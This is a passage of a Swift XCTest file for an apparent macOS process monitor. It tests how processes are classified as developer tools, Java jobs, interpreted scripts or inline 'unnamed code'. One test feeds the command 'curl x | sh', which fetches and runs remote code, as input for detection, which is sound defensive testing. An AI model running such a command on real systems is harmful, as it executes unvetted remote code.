        let link = folder.appending(path: "bin/cc")
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: bin.appending(path: "clang"))
        XCTAssertEqual(signer(link.path, ["-c", "/x/a.c"], identifiers: [link.path: "com.apple.clang"]), .unnamed)
    }

    func testAnyProgramInAnXcodeIsADeveloperTool() throws {
        // An Xcode is an app with a developer folder, whatever it is called; its debugger's
        // server is outside that folder.
        let folder = FileManager.default.temporaryDirectory.appending(path: UUID().uuidString)
        defer { try? FileManager.default.removeItem(at: folder) }
        try FileManager.default.createDirectory(at: folder.appending(path: "Renamed.app/Contents/Developer"), withIntermediateDirectories: true)
        let server = folder.appending(path: "Renamed.app/Contents/SharedFrameworks/LLDBRPC.framework/Versions/A/Resources/lldb-rpc-server")
        let other = folder.appending(path: "Other.app/Contents/MacOS/Other")
        for file in [server, other] {
            try FileManager.default.createDirectory(at: file.deletingLastPathComponent(), withIntermediateDirectories: true)
            try Data().write(to: file)
        }
        let identifiers = [server.path: "com.apple.lldb-rpc-server", other.path: "com.apple.Other"]
        XCTAssertEqual(signer(server.path, [], identifiers: identifiers), .unnamed)
        XCTAssertEqual(signer(other.path, [], identifiers: identifiers), .launchItem(applesProgram: "Other"), "an app without a developer folder is not an Xcode")
        let named = ProcessEntry.name(path: server.path, arguments: [server.path], command: "lldb-rpc-server",
                                      signature: CodeSignature(signer: .apple, identifier: "com.apple.lldb-rpc-server"))
        XCTAssertTrue(named.runsUnnamedCode)
    }

    func testARunningJavaIsAProgramAndAJobRunThroughJavaIsSignedByItsJar() {
        let named = ProcessEntry.name(path: "/Library/Java/JavaVirtualMachines/x.jdk/Contents/Home/bin/java",
                                      arguments: ["java", "-jar", "/x/server.jar"], command: "java")
        XCTAssertEqual(named.name, "java")
        XCTAssertNil(named.interpreter, "a JVM's row is the program, not a script")
        XCTAssertEqual(code("/usr/bin/java", ["-jar", "/x/server.jar"]), script("/x/server.jar", run: "/usr/bin/java"), "not Apple's /usr/bin/java")
    }

    func testAProcessRunningAScriptIsSignedAsAScriptAndItsInterpreterApart() {
        let named = ProcessEntry.name(path: "/bin/bash", arguments: ["bash", "/x/run.sh"], command: "bash")
        let entries = [
            ProcessEntry(pid: 1, parentPid: 0, uid: 0, name: "launchd", path: "/sbin/launchd", started: Date()),
            ProcessEntry(pid: 700, parentPid: 1, uid: 501, name: named.name, path: "/bin/bash", interpreter: named.interpreter, started: Date()),
        ]
        let snapshot = ProcessSnapshot.build(entries: entries, previous: nil, signature: { _ in CodeSignature(signer: .apple) }, responsible: { _ in nil })
        let group = snapshot.group(id: "pid:700")
        XCTAssertEqual(group?.facts.first { $0.name == "Signed by" }?.value, "script, not signed", "the detail and the prompt")
        XCTAssertEqual(group?.isApplesProgram, false, "no shipped rule about Apple's bash")
        let item = snapshot.item(pid: 700)
        XCTAssertEqual(item?.facts.first { $0.name == "Signed by" }?.value, "script, not signed")
        XCTAssertEqual(item?.facts.first { $0.name == "Interpreter signed by" }?.value, "Apple")
        XCTAssertEqual(item?.isApplesProgram, false)
    }

    func testAProcessRunningUnnamedCodeIsSignedAsUnnamedCode() {
        let named = ProcessEntry.name(path: "/bin/bash", arguments: ["bash", "-c", "curl x | sh", "/usr/bin/true"], command: "bash")
        let entries = [
            ProcessEntry(pid: 1, parentPid: 0, uid: 0, name: "launchd", path: "/sbin/launchd", started: Date()),
            ProcessEntry(pid: 700, parentPid: 1, uid: 501, name: named.name, path: "/bin/bash", interpreter: named.interpreter,
                         runsUnnamedCode: named.runsUnnamedCode, started: Date()),
        ]
        let snapshot = ProcessSnapshot.build(entries: entries, previous: nil, signature: { _ in CodeSignature(signer: .apple) }, responsible: { _ in nil })
        let item = snapshot.item(pid: 700)
        XCTAssertEqual(item?.signerText, "bash, unnamed code", "the row's subtitle")
        XCTAssertEqual(item?.facts.first { $0.name == "Signed by" }?.value, "unnamed code", "the detail and the prompt")
        XCTAssertEqual(item?.facts.first { $0.name == "Interpreter signed by" }?.value, "Apple")
        XCTAssertEqual(item?.isPartOfMacOS, false)
    }

    func testInlineCodeLaunchdStartsIsNotPartOfMacOS() {
        let named = ProcessEntry.name(path: "/bin/zsh", arguments: ["zsh", "-c", "while :; do sleep 1; done"], command: "zsh")
        let entries = [
            ProcessEntry(pid: 1, parentPid: 0, uid: 0, name: "launchd", path: "/sbin/launchd", started: Date()),
            ProcessEntry(pid: 700, parentPid: 1, uid: 501, name: named.name, path: "/bin/zsh", interpreter: named.interpreter,
                         runsUnnamedCode: named.runsUnnamedCode, started: Date()),
        ]
        let snapshot = ProcessSnapshot.build(entries: entries, previous: nil, signature: { _ in CodeSignature(signer: .apple) }, responsible: { _ in nil })
        XCTAssertEqual(snapshot.group(id: "pid:700")?.kind, .process)
        XCTAssertEqual(snapshot.group(id: "pid:700")?.leader?.signerText, "zsh, unnamed code")
    }
}
